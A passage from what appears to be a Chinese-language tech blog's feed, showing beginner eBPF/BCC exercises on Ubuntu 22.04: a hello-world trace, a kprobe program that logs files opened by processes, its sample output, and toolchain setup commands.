class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 hello.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693212: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7270.693407: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246610: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246653: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.246911: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247487: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43243   [000] d...1  7271.247529: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248757: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43244   [000] d...1  7271.248848: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249767: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43245   [000] d...1  7271.249825: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.251964: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;             who-43246   [000] d...1  7271.252028: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253499: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;           &lt;...&gt;-43247   [000] d...1  7271.253554: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7271.943581: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;    systemd-oomd-636     [001] d...1  7272.943654: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.267842: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            head-43255   [000] d...1  7273.268730: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272320: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.272921: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.273573: bpf_trace_printk: Hello, World!&#x27;</span><br>b<span class="hljs-string">&#x27;            tail-43256   [000] d...1  7273.274131: bpf_trace_printk: Hello, World!&#x27;</span><br><br><br></code></pre></td></tr></table></figure><h2 id="æ”¹è¿›"><a href="#æ”¹è¿›" class="headerlink" title="æ”¹è¿›"></a>æ”¹è¿›</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.c</span><br>// åŒ…å«å¤´æ–‡ä»¶<br><span class="hljs-comment">#include &lt;uapi/linux/openat2.h&gt;</span><br><span class="hljs-comment">#include &lt;linux/sched.h&gt;</span><br><br>// å®šä¹‰æ•°æ®ç»“æ„<br>struct data_t &#123;<br>  u32 pid;<br>  u64 ts;<br>  char <span class="hljs-built_in">comm</span>[TASK_COMM_LEN];<br>  char fname[NAME_MAX];<br>&#125;;<br><br>// å®šä¹‰æ€§èƒ½äº‹ä»¶æ˜ å°„  å®šä¹‰ä¸€ä¸ª Perf äº‹ä»¶ç±»å‹çš„ BPF æ˜ å°„<br>BPF_PERF_OUTPUT(events);<br><br><br><br>// å®šä¹‰kprobeå¤„ç†å‡½æ•°<br>int hello_world(struct pt_regs *ctx, int dfd, const char __user * filename, struct open_how *how)<br>&#123;<br>  struct data_t data = &#123; &#125;;<br><br>  // è·å–PIDå’Œæ—¶é—´<br>  data.pid = bpf_get_current_pid_tgid();  // bpf_get_current_pid_tgidç”¨äºè·å–è¿›ç¨‹çš„ TGID å’Œ PIDã€‚å› ä¸ºè¿™å„¿å®šä¹‰çš„ data.pid æ•°æ®ç±»å‹ä¸º u32ï¼Œæ‰€ä»¥é«˜ 32 ä½èˆå¼ƒæ‰åå°±æ˜¯è¿›ç¨‹çš„ PID<br>  data.ts = bpf_ktime_get_ns();  // bpf_ktime_get_nsç”¨äºè·å–ç³»ç»Ÿè‡ªå¯åŠ¨ä»¥æ¥çš„æ—¶é—´ï¼Œå•ä½æ˜¯çº³ç§’<br><br>  // è·å–è¿›ç¨‹å<br>  <span class="hljs-keyword">if</span> (bpf_get_current_comm(&amp;data.comm, sizeof(data.comm)) == 0)  // bpf_get_current_commç”¨äºè·å–è¿›ç¨‹åï¼Œå¹¶æŠŠè¿›ç¨‹åå¤åˆ¶åˆ°é¢„å®šä¹‰çš„ç¼“å†²åŒºä¸­<br>  &#123;<br>    bpf_probe_read(&amp;data.fname, sizeof(data.fname), (void *)filename); // bpf_probe_read ç”¨äºä»æŒ‡å®šæŒ‡é’ˆå¤„è¯»å–å›ºå®šå¤§å°çš„æ•°æ®ï¼Œè¿™é‡Œåˆ™ç”¨äºè¯»å–è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶åã€‚<br>  &#125;<br><br>  // æäº¤æ€§èƒ½äº‹ä»¶ è°ƒç”¨ perf_submit() æŠŠæ•°æ®æäº¤åˆ°åˆšæ‰å®šä¹‰çš„ BPF æ˜ å°„<br>  events.perf_submit(ctx, &amp;data, sizeof(data));<br>  <span class="hljs-built_in">return</span> 0;<br>&#125;<br><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># cat trace-open.py</span><br>from bcc import BPF<br><br><span class="hljs-comment"># 1) load BPF program</span><br><span class="hljs-comment"># åŠ è½½ eBPF ç¨‹åºå¹¶æŒ‚è½½åˆ°å†…æ ¸æ¢é’ˆä¸Š</span><br>b = BPF(src_file=<span class="hljs-string">&quot;trace-open.c&quot;</span>)<br>b.attach_kprobe(event=<span class="hljs-string">&quot;do_sys_openat2&quot;</span>, fn_name=<span class="hljs-string">&quot;hello_world&quot;</span>)<br><br><span class="hljs-comment"># 2) print header</span><br><span class="hljs-comment"># è¾“å‡ºä¸€è¡Œ Header å­—ç¬¦ä¸²è¡¨ç¤ºæ•°æ®çš„æ ¼å¼</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18s %-16s %-6s %-16s&quot;</span> % (<span class="hljs-string">&quot;TIME(s)&quot;</span>, <span class="hljs-string">&quot;COMM&quot;</span>, <span class="hljs-string">&quot;PID&quot;</span>, <span class="hljs-string">&quot;FILE&quot;</span>))<br><br><span class="hljs-comment"># 3) define the callback for perf event</span><br><span class="hljs-comment"># print_event å®šä¹‰ä¸€ä¸ªæ•°æ®å¤„ç†çš„å›è°ƒå‡½æ•°ï¼Œæ‰“å°è¿›ç¨‹çš„åå­—ã€PID ä»¥åŠå®ƒè°ƒç”¨ openat æ—¶æ‰“å¼€çš„æ–‡ä»¶</span><br>start = 0<br>def print_event(cpu, data, size):<br>    global start<br>    event = b[<span class="hljs-string">&quot;events&quot;</span>].event(data)<br>    <span class="hljs-keyword">if</span> start == 0:<br>            start = event.ts<br>    time_s = (<span class="hljs-built_in">float</span>(event.ts - start)) / 1000000000<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%-18.9f %-16s %-6d %-16s&quot;</span> % (time_s, event.comm, event.pid, event.fname))<br><br><span class="hljs-comment"># 4) loop with callback to print_event</span><br><span class="hljs-comment"># open_perf_buffer å®šä¹‰äº†åä¸º â€œeventsâ€ çš„ Perf äº‹ä»¶æ˜ å°„ï¼Œè€Œåé€šè¿‡ä¸€ä¸ªå¾ªç¯è°ƒç”¨ perf_buffer_poll è¯»å–æ˜ å°„çš„å†…å®¹ï¼Œå¹¶æ‰§è¡Œå›è°ƒå‡½æ•°è¾“å‡ºè¿›ç¨‹ä¿¡æ¯</span><br>b[<span class="hljs-string">&quot;events&quot;</span>].open_perf_buffer(print_event)<br><span class="hljs-keyword">while</span> 1:<br>    try:<br>        b.perf_buffer_poll()<br>    except KeyboardInterrupt:<br>        <span class="hljs-built_in">exit</span>()<br><br><br><span class="hljs-comment"># æ€æ ·ä»ç”¨æˆ·æ€è¯»å– BPF æ˜ å°„å†…å®¹å¹¶è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰å‘¢ï¼Ÿ</span><br><span class="hljs-comment"># åœ¨ BCC ä¸­ï¼Œä¸ eBPF ç¨‹åºä¸­ BPF_PERF_OUTPUT  ç›¸å¯¹åº”çš„ç”¨æˆ·æ€è¾…åŠ©å‡½æ•°æ˜¯ open_perf_buffer() ã€‚å®ƒéœ€è¦ä¼ å…¥ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†ä» Perf äº‹ä»¶ç±»å‹çš„ BPF æ˜ å°„ä¸­è¯»å–åˆ°çš„æ•°æ®ã€‚</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 geektime]<span class="hljs-comment"># sudo python3 trace-open.py</span><br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:41:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP32__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:4:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP32__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:42:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP64__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:5:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP64__ 1</span><br>        ^<br>In file included from &lt;built-in&gt;:2:<br>In file included from /virtual/include/bcc/bpf.h:12:<br>In file included from include/linux/types.h:6:<br>In file included from include/uapi/linux/types.h:14:<br>In file included from include/uapi/linux/posix_types.h:5:<br>In file included from include/linux/stddef.h:5:<br>In file included from include/uapi/linux/stddef.h:5:<br>In file included from include/linux/compiler_types.h:80:<br>include/linux/compiler-clang.h:43:9: warning: <span class="hljs-string">&#x27;__HAVE_BUILTIN_BSWAP16__&#x27;</span> macro redefined [-Wmacro-redefined]<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__</span><br>        ^<br>&lt;<span class="hljs-built_in">command</span> line&gt;:3:9: note: previous definition is here<br><span class="hljs-comment">#define __HAVE_BUILTIN_BSWAP16__ 1</span><br>        ^<br>3 warnings generated.<br>TIME(s)            COMM             PID    FILE<br>0.000000000        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.249586834        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.pressure&#x27;</span><br>0.249744243        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.current&#x27;</span><br>0.249765844        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.min&#x27;</span><br>0.249783697        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.low&#x27;</span><br>0.249800399        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.swap.current&#x27;</span><br>0.249818063        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-0.slice/user@0.service/memory.stat&#x27;</span><br>0.249918042        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.pressure&#x27;</span><br>0.249993365        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.current&#x27;</span><br>0.250011319        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.min&#x27;</span><br>0.250028852        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.low&#x27;</span><br>0.250045734        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.swap.current&#x27;</span><br>0.250062576        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/sys/fs/cgroup/user.slice/user-1000.slice/user@1000.service/memory.stat&#x27;</span><br>0.250117370        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.499947185        b<span class="hljs-string">&#x27;systemd-oomd&#x27;</span>  636    b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.537863286        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.537898282        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.538648765        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.538766849        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.538832774        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538838585        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538844537        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538850207        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.538868322        b<span class="hljs-string">&#x27;head&#x27;</span>          53569  b<span class="hljs-string">&#x27;/proc/meminfo&#x27;</span><br>0.539986006        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/etc/ld.so.cache&#x27;</span><br>0.540310641        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br>0.541208063        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/lib/locale/locale-archive&#x27;</span><br>0.541523040        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/locale.alias&#x27;</span><br>0.541664007        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541768956        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541841113        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en_US/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541911206        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/usr/share/locale-langpack/en/LC_MESSAGES/coreutils.mo&#x27;</span><br>0.541993672        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/stat&#x27;</span><br>0.542297589        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/version&#x27;</span><br>0.542427826        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/uptime&#x27;</span><br>0.542513568        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/loadavg&#x27;</span><br>0.542576598        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/fs/file-nr&#x27;</span><br>0.542649275        b<span class="hljs-string">&#x27;head&#x27;</span>          53570  b<span class="hljs-string">&#x27;/proc/sys/kernel/hostname&#x27;</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ebpf</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€ebpfã€‘first try2</title>
    <link href="/2023/01/29/ebpf/unsupported/%E3%80%90ebpf%E3%80%91first%20try2/"/>
    <url>/2023/01/29/ebpf/unsupported/%E3%80%90ebpf%E3%80%91first%20try2/</url>
    
    <content type="html"><![CDATA[<h2 id="è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯"><a href="#è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯" class="headerlink" title="è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯"></a>è™šæ‹ŸæœºåŸºæœ¬ç¯å¢ƒä¿¡æ¯</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># uname -a</span><br>Linux ubuntu-22 5.15.0-58-generic <span class="hljs-comment">#64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux</span><br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># uname -r</span><br>5.15.0-58-generic<br><br>[root@ubuntu-22 ~]<span class="hljs-comment"># lsb_release -a</span><br>No LSB modules are available.<br>Distributor ID: Ubuntu<br>Description:    Ubuntu 22.04.1 LTS<br>Release:        22.04<br>Codename:       jammy<br><br></code></pre></td></tr></table></figure><p>æ­å»ºubuntuè™šæ‹Ÿæœºå¯ä»¥çœ‹åˆ°æˆ‘çš„å¦ä¸€ç¯‡æ•™ç¨‹ï¼š<br><a href="https://blog.csdn.net/weixin_42072280/article/details/128351846?spm=1001.2014.3001.5501"># ã€ç½‘ç»œæˆé•¿è®°ã€‘VMware16.2.2ä¸­åˆ›å»ºubuntu22.04.1è™šæ‹Ÿæœº+ä¿®æ”¹é™æ€ip+æ¢æº+mobaxtermè¿œç¨‹è¿æ¥+ä¿®æ”¹å‘½ä»¤æç¤ºç¬¦é¢œè‰²</a></p><h2 id="å®‰è£…-eBPF-å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·"><a href="#å®‰è£…-eBPF-å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·" class="headerlink" title="å®‰è£… eBPF å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·"></a>å®‰è£… eBPF å¼€å‘å’Œè¿è¡Œæ‰€éœ€è¦çš„å¼€å‘å·¥å…·</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># sudo apt-get install -y make clang llvm libelf-dev libbpf-dev bpfcc-tools libbpfcc-dev linux-tools-$(uname -r) linux-headers-$(uname -r)</span><br></code></pre></td></tr></table></figure><h2 id="ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶"><a href="#ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶" class="headerlink" title="ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶"></a>ebpfçš„CO-REç‰¹æ€§å‰ææ¡ä»¶</h2><p>åœ¨ä½¿ç”¨ CO-RE ä¹‹å‰ï¼Œå†…æ ¸éœ€è¦å¼€å¯ CONFIG_DEBUG_INFO_BTF&#x3D;y å’Œ CONFIG_DEBUG_INFO&#x3D;y è¿™ä¸¤ä¸ªç¼–è¯‘é€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ubuntu-22 ~]<span class="hljs-comment"># cat /boot/config-5.15.0-58-generic  |grep -i config_debug_info</span><br>CONFIG_DEBUG_INFO=y<br><span class="hljs-comment"># CONFIG_DEBUG_INFO_REDUCED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_COMPRESSED is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_SPLIT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT is not set</span><br><span class="hljs-comment"># CONFIG_DEBUG_INFO_DWARF4 is not set</span><br>CONFIG_DEBUG_INFO_DWARF5=y<br>CONFIG_DEBUG_INFO_BTF=y<br>CONFIG_DEBUG_INFO_BTF_MODULES=y<br>[root@ubuntu-22 ~]<span class="hljs-comment">#</span><br>[root@ubuntu-22 ~]<span class="hljs-comment"># ll /sys/kernel/btf/vmlinux</span><br>-r--r--r-- 1 root 